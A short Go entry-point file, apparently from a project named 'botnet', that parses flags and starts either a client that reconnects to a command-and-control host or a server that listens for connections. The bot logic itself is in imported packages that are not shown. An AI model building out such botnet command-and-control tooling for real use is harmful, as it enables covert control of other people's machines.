package main

import (
	"flag"
	"time"

	"gitlab.com/rodzzlessa24/botnet/client"
	"gitlab.com/rodzzlessa24/botnet/server"
)

func main() {
	listenPtr := flag.Bool("listen", false, "listen on [host]:[port] for incoming connections")
	portPtr := flag.Int("port", 9999, "port to listen on")
	targetPtr := flag.String("target", "", "target host")
	reconPtr := flag.Int64("rt", 1, "Time to reconnect to cc")

	flag.Parse()

	// Check if this is a client or a server
	if !*listenPtr && *targetPtr != "" {
		c := &client.Client{
			Port:       *portPtr,
			Target:     *targetPtr,
			ReconnTime: time.Duration(*reconPtr),
		}
		c.Run()
	}

	// Okay it is a server
	if *listenPtr {
		c := &server.Server{
			Port:   *portPtr,
			Target: *targetPtr,
		}
		c.Run()
	}
}
